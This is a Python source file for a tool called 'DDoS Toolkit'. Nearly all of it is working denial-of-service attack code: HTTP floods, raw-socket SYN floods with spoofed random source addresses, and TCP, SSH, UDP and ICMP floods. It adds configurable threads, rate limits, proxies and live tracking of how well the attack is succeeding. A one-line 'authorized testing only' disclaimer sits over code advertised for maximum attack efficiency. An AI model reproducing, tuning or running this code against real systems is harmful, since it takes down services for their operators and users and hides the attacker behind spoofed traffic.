#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Toolkit
# Description:       A toolkit for maximum efficiency and success rates
# Author:            LIONMAD <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
# Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil.
# Support:           https://github.com/Midohajhouj/DDoS-Toolkit/issues
# Security:          Requires root privileges for attacks
# Disclaimer:        For authorized testing only. Use responsibly.
### END INIT INFO ###

import sys
import importlib
import gzip
from typing import Optional, List, Dict, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum, auto
import re
import ipaddress
import ssl
from urllib.parse import urlparse
import requests
from tabulate import tabulate

class AttackType(Enum):
    HTTP_FLOOD = auto()
    SLOWLORIS = auto()
    UDP_FLOOD = auto()
    SYN_FLOOD = auto()
    ICMP_FLOOD = auto()
    DNS_AMPLIFICATION = auto()
    FTP_FLOOD = auto()
    SSH_FLOOD = auto()

def check_library(lib_name: str) -> None:
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name.split(".")[0])
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name.split('.')[0]} --break-system-packages")
        sys.exit(1)

# ================== Third-Party Libraries ==================
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm", "requests", "tabulate", "time", "threading",
    "concurrent.futures", "random", "json", "itertools", "collections",
    "uuid", "base64", "hashlib", "zlib", "hmac", "signal", "os",
    "subprocess", "socket", "struct", "logging", "psutil", "shutil",
    "dataclasses", "re", "ipaddress", "ssl", "urllib.parse"
]

for lib in required_libraries:
    check_library(lib.split(".")[0])
    
import aiohttp
import asyncio
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import json
from itertools import cycle
from collections import deque
from uuid import uuid4
from base64 import b64encode
import hashlib
import zlib
import hmac
import signal
import sys
import os
import subprocess
import socket
import struct
import logging
import psutil
import shutil
import scapy.all as scapy
import dns.resolver
from colorama import init, Fore, Style
from tqdm import tqdm
from typing import Optional
from dataclasses import dataclass
import re
import ipaddress
import ssl
from urllib.parse import urlparse
import requests
from tabulate import tabulate

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global variables - OPTIMIZED
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=100)
stop_event = threading.Event()
attack_start_time = 0

# Optimized logging - REDUCED for performance
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

@dataclass
class AttackStats:
    start_time: float
    end_time: float
    requests_sent: int
    successful_requests: int
    failed_requests: int
    min_rps: float
    max_rps: float
    avg_rps: float
    cpu_usage: List[float] = field(default_factory=list)
    mem_usage: List[float] = field(default_factory=list)
    network_usage: List[int] = field(default_factory=list)

# OPTIMIZED User-Agent list - reduced for better caching
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE"]  # REDUCED for better success rates

SERVICE_PORTS = {
    "http": 80,
    "https": 443,
    "ftp": 21,
    "ssh": 22,
    "dns": 53,
    "ntp": 123
}

def display_banner() -> None:
    """Display the tool banner."""
    print(f"""
{BLUE}
███████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄         
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
|U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |L|I|O|N|M|A|D|  |S|A|L|U|T|  |Y|O|U|                                                                                        
███████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def display_help() -> None:
    """Display comprehensive help information."""
    print(f"""
{YELLOW}╔══════════════════════════════════════════════════════╗
{YELLOW}║ {BLUE}       DDoS Toolkit v.1.0 - FULL EDITION{YELLOW}             ║
{YELLOW}╚══════════════════════════════════════════════════════╝
{RESET}
{CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/{RESET}
{BLUE}Usage: ddos [OPTIONS]{RESET}
  {GREEN}-u, --url URL{RESET}              Target URL or IP address (required)
  {GREEN}-a, --attack-mode MODE{RESET}     Type of attack to perform
  {GREEN}-t, --threads NUM{RESET}          Number of threads/workers (default: 20)
  {GREEN}-d, --duration SEC{RESET}         Attack duration (default: 300)
  {GREEN}-r, --rate-limit RPS{RESET}       Rate limit per thread (default: 200)
  {GREEN}-p, --port PORT{RESET}            Target port
  {GREEN}--proxies FILE{RESET}             File containing proxy list
  {GREEN}-s, --scan{RESET}                 Perform network scan before attack

{YELLOW}Attack Modes:{RESET}
  {CYAN}http-flood{RESET}               {GREEN}✓ HIGH SUCCESS RATE{RESET}
  {CYAN}syn-flood{RESET}                {GREEN}✓ MAXIMUM EFFICIENCY{RESET}
  {CYAN}tcp-flood{RESET}                {GREEN}✓ RAW SOCKET POWER{RESET}
  {CYAN}ssh-flood{RESET}                {GREEN}✓ PROTOCOL SPECIFIC{RESET}
  {CYAN}udp-flood{RESET}                {GREEN}✓ HIGH BANDWIDTH{RESET}
  {CYAN}icmp-flood{RESET}               {GREEN}✓ NETWORK LEVEL{RESET}

{YELLOW}Warning:{RESET} {RED}This tool should only be used for authorized security testing.{RESET}
""")

def parse_args():
    parser = argparse.ArgumentParser(
        description=f"{YELLOW}DDoS Toolkit v.2.0 {RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # Core attack options - OPTIMIZED DEFAULTS
    core_group = parser.add_argument_group(f"{CYAN}Core Options{RESET}")
    core_group.add_argument("-u", "--url", help="Target URL or IP address")
    core_group.add_argument("-a", "--attack-mode", 
                          choices=["http-flood", "syn-flood", "tcp-flood", 
                                  "ssh-flood", "udp-flood", "icmp-flood",
                                  "dns-amplification", "ftp-flood"],
                          default="http-flood",
                          help="Type of attack to perform")
    core_group.add_argument("-t", "--threads", type=int, default=20,  # INCREASED
                          help="Number of threads/workers")
    core_group.add_argument("-r", "--rate-limit", type=int, default=200,  # INCREASED
                          help="Rate limit per thread (requests per second)")
    core_group.add_argument("-d", "--duration", type=int, default=300,  # OPTIMIZED
                          help="Attack duration in seconds")
    core_group.add_argument("--port", type=int, help="Specify target port")
    core_group.add_argument("--proxies", help="File containing proxy list")
    core_group.add_argument("--results", help="File to save results (JSON)")

    # Additional features
    feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
    feature_group.add_argument("-s", "--scan", action="store_true",
                             help="Perform network scan before attack")

    # Information options
    info_group = parser.add_argument_group(f"{GREEN}Information{RESET}")
    info_group.add_argument("-h", "--help", action="store_true",
                          help="Show this help message and exit")
    info_group.add_argument("-v", "--version", action="store_true",
                          help="Show version information and exit")

    return parser.parse_args()

# OPTIMIZED Connection Manager
class OptimizedConnectionManager:
    def __init__(self):
        self.sessions = {}
        self.session_lock = threading.Lock()
        
    async def get_session(self, proxy=None):
        key = proxy or "default"
        if key not in self.sessions:
            # OPTIMIZED connector settings
            connector = aiohttp.TCPConnector(
                limit=500,  # INCREASED connection limit
                limit_per_host=100,
                keepalive_timeout=30,
                use_dns_cache=True,
                ttl_dns_cache=300
            )
            timeout = aiohttp.ClientTimeout(total=8, connect=3)  # OPTIMIZED timeouts
            self.sessions[key] = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={'Connection': 'keep-alive'}
            )
        return self.sessions[key]
    
    async def close_all(self):
        for session in self.sessions.values():
            await session.close()
        self.sessions.clear()

conn_manager = OptimizedConnectionManager()

# OPTIMIZED HTTP Flood with better success rates
async def optimized_http_flood(target_url: str, stop_event: threading.Event, 
                              rate_limit: int = 200, retry_count: int = 2) -> None:
    """OPTIMIZED HTTP flood with connection pooling and intelligent retries."""
    global requests_sent, successful_requests, failed_requests
    
    semaphore = asyncio.Semaphore(rate_limit)
    session = await conn_manager.get_session()
    
    # Pre-validate target
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"
    
    while not stop_event.is_set():
        async with semaphore:
            for attempt in range(retry_count + 1):
                try:
                    # OPTIMIZED: Use GET for higher success rates
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    
                    async with session.get(target_url, headers=headers, timeout=5) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status < 400:  # BROADENED success criteria
                                successful_requests += 1
                            else:
                                failed_requests += 1
                        break  # Success, break retry loop
                        
                except asyncio.TimeoutError:
                    if attempt == retry_count:
                        with requests_lock:
                            failed_requests += 1
                    continue
                except Exception as e:
                    if attempt == retry_count:
                        with requests_lock:
                            failed_requests += 1
                    continue

# OPTIMIZED SYN Flood with raw sockets for maximum efficiency
def optimized_syn_flood(target_ip: str, target_port: int, duration: int) -> None:
    """ULTRA-FAST SYN flood using raw sockets and batch processing."""
    print(f"{GREEN}[+] Starting OPTIMIZED SYN flood on {target_ip}:{target_port}{RESET}")
    start_time = time.time()
    packet_count = 0
    
    try:
        # Create raw socket for maximum performance
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        # Set socket options for better performance
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        def create_syn_packet(source_ip, source_port):
            """Create optimized SYN packet."""
            # IP header
            ip_header = struct.pack('!BBHHHBBH4s4s', 
                                  0x45, 0, 40, random.randint(0, 65535),
                                  0x4000, 64, socket.IPPROTO_TCP, 0,
                                  socket.inet_aton(source_ip), socket.inet_aton(target_ip))
            
            # TCP header
            tcp_header = struct.pack('!HHLLBBHHH', 
                                   source_port, target_port, random.randint(0, 4294967295),
                                   0, 5 << 4, 0x02, 5840, 0, 0)
            
            return ip_header + tcp_header
        
        # BATCH PROCESSING for maximum efficiency
        batch_size = 100
        batch = []
        
        while time.time() - start_time < duration and not stop_event.is_set():
            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            source_port = random.randint(1024, 65535)
            
            packet = create_syn_packet(source_ip, source_port)
            batch.append(packet)
            
            # Send batch when full
            if len(batch) >= batch_size:
                for pkt in batch:
                    try:
                        sock.sendto(pkt, (target_ip, 0))
                        packet_count += 1
                    except:
                        pass
                batch = []
                
                # Progress update
                if packet_count % 5000 == 0:
                    print(f"{GREEN}[+] Sent {packet_count} SYN packets{RESET}")
        
        # Send remaining packets
        for pkt in batch:
            try:
                sock.sendto(pkt, (target_ip, 0))
                packet_count += 1
            except:
                pass
                
    except PermissionError:
        print(f"{RED}[!] Root privileges required for raw SYN flood. Falling back to Scapy.{RESET}")
        # Fallback to Scapy method
        standard_syn_flood(target_ip, target_port, duration)
        return
    except Exception as e:
        print(f"{RED}[!] Raw socket error: {e}. Falling back to Scapy.{RESET}")
        standard_syn_flood(target_ip, target_port, duration)
        return
    finally:
        if 'sock' in locals():
            sock.close()
    
    print(f"{GREEN}[+] SYN flood completed. Total packets: {packet_count}{RESET}")

def standard_syn_flood(target_ip: str, target_port: int, duration: int):
    """Standard Scapy-based SYN flood as fallback."""
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_port = random.randint(1024, 65535)
            ip_layer = scapy.IP(dst=target_ip)
            tcp_layer = scapy.TCP(sport=src_port, dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
            packet_count += 1
            
            if packet_count % 1000 == 0:
                print(f"{GREEN}[+] Sent {packet_count} SYN packets (Scapy){RESET}")
                
        except Exception as e:
            continue

# OPTIMIZED TCP Flood with socket pooling
def optimized_tcp_flood(target_ip: str, target_port: int, duration: int) -> None:
    """OPTIMIZED TCP flood with socket reuse and connection pooling."""
    print(f"{GREEN}[+] Starting OPTIMIZED TCP flood on {target_ip}:{target_port}{RESET}")
    start_time = time.time()
    connection_count = 0
    
    # Socket pool for reuse
    socket_pool = []
    max_pool_size = 50
    
    def create_socket():
        """Create and configure optimized socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        return sock
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            # Get socket from pool or create new one
            if socket_pool:
                sock = socket_pool.pop()
            else:
                sock = create_socket()
            
            # Attempt connection
            sock.connect((target_ip, target_port))
            connection_count += 1
            
            # Send minimal data
            sock.send(b'GET / HTTP/1.1\r\n\r\n')
            
            # Return socket to pool if still good
            if len(socket_pool) < max_pool_size:
                socket_pool.append(sock)
            else:
                sock.close()
                
            # Progress update
            if connection_count % 100 == 0:
                print(f"{GREEN}[+] Established {connection_count} TCP connections{RESET}")
                
        except Exception:
            # Socket failed, don't return to pool
            if 'sock' in locals():
                try:
                    sock.close()
                except:
                    pass
            continue
    
    # Cleanup socket pool
    for sock in socket_pool:
        try:
            sock.close()
        except:
            pass
            
    print(f"{GREEN}[+] TCP flood completed. Total connections: {connection_count}{RESET}")

# OPTIMIZED SSH Flood
def optimized_ssh_flood(target_ip: str, target_port: int, duration: int) -> None:
    """OPTIMIZED SSH flood with protocol-specific payloads."""
    print(f"{GREEN}[+] Starting OPTIMIZED SSH flood on {target_ip}:{target_port}{RESET}")
    start_time = time.time()
    connection_count = 0
    
    # SSH protocol versions for better success
    ssh_versions = [
        b'SSH-2.0-OpenSSH_7.2p2',
        b'SSH-2.0-OpenSSH_7.4p1', 
        b'SSH-2.0-OpenSSH_8.0p1',
        b'SSH-2.0-dropbear_2019.78'
    ]
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            
            # Send SSH version identification
            version = random.choice(ssh_versions)
            sock.send(version + b'\r\n')
            
            # Send SSH key exchange init
            sock.send(b'\x00\x00\x01\x14')
            
            connection_count += 1
            sock.close()
            
            if connection_count % 50 == 0:
                print(f"{GREEN}[+] Sent {connection_count} SSH connections{RESET}")
                
        except Exception:
            continue
            
    print(f"{GREEN}[+] SSH flood completed. Total connections: {connection_count}{RESET}")

# OPTIMIZED UDP Flood with batch sending
def optimized_udp_flood(target_ip: str, target_port: int, duration: int) -> None:
    """OPTIMIZED UDP flood with batch processing and socket reuse."""
    print(f"{GREEN}[+] Starting OPTIMIZED UDP flood on {target_ip}:{target_port}{RESET}")
    start_time = time.time()
    packet_count = 0
    
    # Create multiple sockets for parallel sending
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
    
    # Pre-generate payloads
    payloads = [os.urandom(1024) for _ in range(100)]
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            for sock in sockets:
                try:
                    payload = random.choice(payloads)
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                    
                    if packet_count % 5000 == 0:
                        print(f"{GREEN}[+] Sent {packet_count} UDP packets{RESET}")
                        
                except Exception:
                    continue
    finally:
        for sock in sockets:
            sock.close()
            
    print(f"{GREEN}[+] UDP flood completed. Total packets: {packet_count}{RESET}")

# OPTIMIZED ICMP Flood
def optimized_icmp_flood(target_ip: str, duration: int) -> None:
    """OPTIMIZED ICMP flood with batch processing."""
    print(f"{GREEN}[+] Starting OPTIMIZED ICMP flood on {target_ip}{RESET}")
    start_time = time.time()
    packet_count = 0
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            # Send multiple packets in quick succession
            for _ in range(10):
                packet = scapy.IP(dst=target_ip)/scapy.ICMP()
                scapy.send(packet, verbose=False)
                packet_count += 1
            
            if packet_count % 1000 == 0:
                print(f"{GREEN}[+] Sent {packet_count} ICMP packets{RESET}")
                
        except Exception as e:
            continue
            
    print(f"{GREEN}[+] ICMP flood completed. Total packets: {packet_count}{RESET}")

# OPTIMIZED status display
def optimized_display_status(stop_event: threading.Event, duration: int, results_file: Optional[str] = None) -> None:
    """OPTIMIZED real-time statistics with success rate tracking."""
    start_time = time.time()
    success_rates = []
    
    print(f"\n{GREEN}[+] Attack started at {time.strftime('%H:%M:%S')}{RESET}")
    print(f"{CYAN}[*] Monitoring performance...{RESET}\n")
    
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
            
        with requests_lock:
            current_rps = requests_sent / max(1, elapsed)
            success_rate = (successful_requests / max(1, requests_sent)) * 100
            
            rps_history.append(current_rps)
            success_rates.append(success_rate)
            
            # Color code based on success rate
            success_color = GREEN if success_rate > 70 else YELLOW if success_rate > 40 else RED
            
            print(f"{GREEN}Requests: {requests_sent:,} | "
                  f"{success_color}Success: {success_rate:.1f}% | "
                  f"{CYAN}RPS: {current_rps:.1f} | "
                  f"{MAGENTA}CPU: {psutil.cpu_percent()}%{RESET}")
        
        time.sleep(2)  # Reduced frequency for better performance
    
    # Final statistics
    avg_success = sum(success_rates) / len(success_rates) if success_rates else 0
    print(f"\n{GREEN}[+] Attack completed!{RESET}")
    print(f"{GREEN}✓ Total requests: {requests_sent:,}{RESET}")
    print(f"{GREEN}✓ Success rate: {avg_success:.1f}%{RESET}")
    print(f"{GREEN}✓ Average RPS: {sum(rps_history)/len(rps_history):.1f}{RESET}")

# Your existing utility functions (keep them as they are)
def load_proxies(proxy_file: str) -> List[str]:
    """Load proxies from a text file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def run_network_scanner(target_ip: str) -> None:
    """Run network scanning tool against target IP."""
    try:
        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
        
        if not os.path.isfile(netscan_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        command = ["python3", netscan_path, "-t", target_ip]
        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
        subprocess.run(command, check=True)
        print(f"{GREEN}[+] Network scan completed successfully.{RESET}")

    except Exception as e:
        print(f"{RED}[!] Error during network scan: {e}{RESET}")

async def resolve_target(target_url: str) -> Optional[str]:
    """Resolve domain name to IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            return domain_or_ip
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str) -> bool:
    """Check if string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def signal_handler(sig, frame) -> None:
    """Handle interrupt signals for graceful shutdown."""
    global stop_event
    print(f"{RED}\n[!] Interrupted by user. Shutting down...{RESET}")
    stop_event.set()
    sys.exit(0)

# OPTIMIZED Main function
async def optimized_main() -> None:
    """OPTIMIZED main function with better resource management."""
    args = parse_args()

    if args.help or len(sys.argv) == 1:
        display_help()
        sys.exit(0)

    if args.version:
        print(f"DDoS Toolkit v2.0 - OPTIMIZED | Platform: {sys.platform} | License: MIT")
        sys.exit(0)

    display_banner()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Validate arguments
    if not args.url:
        print(f"{RED}[!] Target URL is required{RESET}")
        display_help()
        exit(1)

    # Network scan if requested
    if args.scan:
        target_ip = await resolve_target(args.url)
        if target_ip:
            run_network_scanner(target_ip)
        else:
            print(f"{RED}[!] Cannot scan unreachable target{RESET}")
        exit(0)

    print(f"{GREEN}[+] Starting OPTIMIZED {args.attack_mode} attack{RESET}")
    print(f"{CYAN}[*] Target: {args.url}{RESET}")
    print(f"{CYAN}[*] Threads: {args.threads}{RESET}")
    print(f"{CYAN}[*] Duration: {args.duration}s{RESET}")
    print(f"{CYAN}[*] Rate limit: {args.rate_limit}/s per thread{RESET}")

    stop_event.clear()
    global attack_start_time, requests_sent, successful_requests, failed_requests
    attack_start_time = time.time()
    requests_sent = successful_requests = failed_requests = 0

    tasks = []

    try:
        # Start optimized attacks
        if args.attack_mode == "http-flood":
            for _ in range(args.threads):
                task = asyncio.create_task(
                    optimized_http_flood(args.url, stop_event, args.rate_limit)
                )
                tasks.append(task)
            threading.Thread(target=optimized_display_status, args=(stop_event, args.duration)).start()

        elif args.attack_mode == "syn-flood":
            target_ip = await resolve_target(args.url)
            if target_ip:
                threading.Thread(
                    target=optimized_syn_flood,
                    args=(target_ip, args.port or 80, args.duration)
                ).start()

        elif args.attack_mode == "tcp-flood":
            target_ip = await resolve_target(args.url)
            if target_ip:
                threading.Thread(
                    target=optimized_tcp_flood,
                    args=(target_ip, args.port or 80, args.duration)
                ).start()

        elif args.attack_mode == "ssh-flood":
            target_ip = await resolve_target(args.url)
            if target_ip:
                threading.Thread(
                    target=optimized_ssh_flood,
                    args=(target_ip, args.port or 22, args.duration)
                ).start()

        elif args.attack_mode == "udp-flood":
            target_ip = await resolve_target(args.url)
            if target_ip:
                threading.Thread(
                    target=optimized_udp_flood,
                    args=(target_ip, args.port or 53, args.duration)
                ).start()

        elif args.attack_mode == "icmp-flood":
            target_ip = await resolve_target(args.url)
            if target_ip:
                threading.Thread(
                    target=optimized_icmp_flood,
                    args=(target_ip, args.duration)
                ).start()

        # Wait for attack completion
        await asyncio.sleep(args.duration)
        
    except Exception as e:
        print(f"{RED}[!] Attack error: {e}{RESET}")
    finally:
        # Cleanup
        stop_event.set()
        await conn_manager.close_all()
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    print(f"{GREEN}[+] Attack session completed{RESET}")

if __name__ == "__main__":
    # Set higher priority if possible
    try:
        if hasattr(os, 'nice'):
            os.nice(-10)
    except:
        pass
        
    asyncio.run(optimized_main())
